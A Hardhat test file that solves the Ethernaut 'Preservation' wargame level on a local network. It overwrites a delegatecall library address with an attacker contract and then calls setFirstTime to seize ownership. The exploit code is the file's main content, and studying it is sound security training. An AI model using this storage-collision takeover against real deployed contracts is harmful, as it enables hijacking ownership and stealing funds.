const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");

describe("Ethernaut - Sixteen", function () {
  async function deployContracts() {
    const [deployer, user1] = await ethers.getSigners();

    const EthernautSixteenLibraryContract = await ethers.getContractFactory(
      "EthernautSixteenLibraryContract"
    );
    const ethernautSixteenLibraryContract =
      await EthernautSixteenLibraryContract.deploy();
    await ethernautSixteenLibraryContract.deployed();

    const EthernautSixteenPreservation = await ethers.getContractFactory(
      "EthernautSixteenPreservation"
    );
    const ethernautSixteenPreservation =
      await EthernautSixteenPreservation.deploy(
        ethernautSixteenLibraryContract.address,
        ethernautSixteenLibraryContract.address
      );
    await ethernautSixteenPreservation.deployed();

    const EthernautSixteenAttacker = await ethers.getContractFactory(
      "EthernautSixteenAttacker"
    );
    const ethernautSixteenAttacker = await EthernautSixteenAttacker.deploy();
    await ethernautSixteenAttacker.deployed();

    return {
      ethernautSixteenLibraryContract,
      ethernautSixteenPreservation,
      ethernautSixteenAttacker,
      deployer,
      user1,
    };
  }

  describe("Exploit", function () {
    it("Ownership claimed", async function () {
      const {
        ethernautSixteenPreservation,
        ethernautSixteenAttacker,
        deployer,
        user1,
      } = await loadFixture(deployContracts);

      expect(await ethernautSixteenPreservation.owner()).to.equal(
        deployer.address
      );

      // update timeZone1Library slot to point to attacker contract
      const paddedAttackerContractAddress = ethers.utils.defaultAbiCoder.encode(
        ["address"],
        [ethernautSixteenAttacker.address]
      );
      await ethernautSixteenPreservation.setFirstTime(
        paddedAttackerContractAddress
      );
      await ethernautSixteenPreservation.connect(user1).setFirstTime(0);

      expect(await ethernautSixteenPreservation.owner()).to.equal(
        user1.address
      );
    });
  });
});
